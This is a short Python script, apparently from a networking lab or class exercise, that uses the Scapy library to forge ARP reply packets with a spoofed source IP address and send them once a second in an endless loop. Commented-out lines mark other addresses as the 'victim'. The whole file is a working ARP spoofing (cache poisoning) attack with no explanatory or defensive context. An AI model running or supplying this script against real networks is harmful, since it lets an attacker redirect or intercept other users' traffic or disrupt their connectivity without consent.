## Import Scapy module
from scapy.all import *

packet = Ether()/ARP()
packet.op = 2 #replay
packet.psrc = "10.12.161.84"

#packet.psrc="10.12.167.195" #victim
#packet.pdst="10.15.82.62" #victim
sendp(packet, loop =1, inter = 1)

#packet.show()
